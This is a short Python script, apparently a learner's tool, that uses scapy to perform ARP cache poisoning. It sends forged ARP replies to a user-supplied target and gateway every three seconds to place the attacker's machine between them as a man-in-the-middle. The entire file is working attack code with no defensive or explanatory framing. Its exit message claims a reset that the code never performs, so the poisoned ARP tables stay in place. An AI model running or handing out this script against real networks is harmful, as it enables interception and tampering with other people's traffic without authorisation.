import scapy.all as scapy
import time
import optparse

def get_mac_adress(ip):
    arp_request_packet = scapy.ARP(pdst=str(ip))
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout =1,verbose = False)[0]
    return answered_list[0][1].hwsrc

def arp_poising(target_ip,poising_ip):
    target_mac = get_mac_adress(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poising_ip)
    scapy.send(arp_response,verbose=False)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest ="target_ip",help = "Enter a target IP:")
    parse_object.add_option("-g","--gateway",dest ="gateway_ip",help="Enter a gateway IP:")
    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter a target ip:")
    if not options.gateway_ip:
        print("Enter a gateway ip:")
    return options

number =0
user_input = get_user_input()
user_target_ip = user_input.target_ip
user_gateway_ip = user_input.gateway_ip

try:
    while True:
        arp_poising(user_target_ip,user_gateway_ip)
        arp_poising(user_gateway_ip,user_target_ip)
        number+=2
        print("\r Sended Packet "+str(number) ,end ="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit and Reset")




